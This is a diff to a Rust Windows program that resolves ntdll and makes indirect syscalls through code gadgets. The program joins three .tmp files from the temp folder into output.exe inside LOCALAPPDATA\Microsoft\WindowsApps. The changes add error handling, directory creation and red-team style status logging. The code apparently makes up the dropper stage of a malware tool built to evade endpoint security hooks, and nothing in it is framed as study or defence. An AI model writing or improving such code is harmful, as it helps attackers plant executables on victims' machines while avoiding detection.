@@ -44,7 +44,7 @@ fn to_nt_path(path: &str) -> Vec<u16> {
 }
 
 fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
-    let len = (buffer.len() - 1) * 2;
+    let len = if buffer.is_empty() { 0 } else { (buffer.len() - 1) * 2 };
     UNICODE_STRING {
         Length: len as u16,
         MaximumLength: (len + 2) as u16,
@@ -56,6 +56,7 @@ fn main() {
     unsafe {
         let ntdll_base = syscalls::get_ntdll_base();
         if ntdll_base.is_null() {
+            eprintln!("[-] Failed to get ntdll base");
             return;
         }
 
@@ -70,7 +71,10 @@ fn main() {
         let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
         let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
 
-        let out_path_str = format!("{}\\Microsoft\\WindowsApps\\output.exe", local_app_data);
+        let target_dir = format!("{}\\Microsoft\\WindowsApps", local_app_data);
+        let _ = std::fs::create_dir_all(&target_dir);
+
+        let out_path_str = format!("{}\\output.exe", target_dir);
         let out_path_wide = to_nt_path(&out_path_str);
         let out_unicode = create_unicode_string(&out_path_wide);
 
@@ -103,8 +107,10 @@ fn main() {
         );
 
         if status != 0 {
+            eprintln!("[-] NtCreateFile (output) failed with status: 0x{:08X}", status);
             return;
         }
+        println!("[+] Successfully created output file: {}", out_path_str);
 
         for i in 1..=3 {
             let in_path_str = format!("{}\\{}.tmp", temp_dir, i);
@@ -139,6 +145,7 @@ fn main() {
             );
 
             if status == 0 {
+                println!("[+] Merging {}...", in_path_str);
                 let mut buffer = [0u8; 8192];
                 loop {
                     let mut read_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
@@ -157,12 +164,19 @@ fn main() {
                         0
                     );
 
-                    if status != 0 || read_io_status.Information == 0 {
+                    if status != 0 {
+                        if status as u32 != 0xC0000011 { // STATUS_END_OF_FILE
+                            eprintln!("[-] NtReadFile failed with status: 0x{:08X}", status);
+                        }
+                        break;
+                    }
+
+                    if read_io_status.Information == 0 {
                         break;
                     }
 
                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
-                    syscall!(
+                    let status = syscall!(
                         nt_write_file_ssn,
                         syscall_gadget,
                         jmp_rbx_gadget,
@@ -176,11 +190,19 @@ fn main() {
                         0,
                         0
                     );
+
+                    if status != 0 {
+                        eprintln!("[-] NtWriteFile failed with status: 0x{:08X}", status);
+                        break;
+                    }
                 }
                 syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, in_handle as usize);
+            } else {
+                eprintln!("[-] Failed to open {} for reading, status: 0x{:08X}", in_path_str, status);
             }
         }
 
         syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+        println!("[+] Done.");
     }
 }
